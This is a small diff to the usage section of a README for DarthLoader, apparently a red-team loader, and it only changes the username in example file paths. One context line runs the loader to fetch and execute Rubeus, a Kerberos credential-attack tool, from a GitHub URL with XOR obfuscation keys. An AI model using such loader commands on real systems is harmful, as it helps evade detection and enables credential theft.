@@ -37,9 +37,9 @@ DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flang
 
 DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe --XorKey test
 
-DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\devin\Desktop\Hello.exe
+DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\d4ddyd4rth\Desktop\Hello.exe
 
-DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\devin\Desktop\Hello.exe --Args test
+DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\d4ddyd4rth\Desktop\Hello.exe --Args test
 ```
 ### Example
 ```
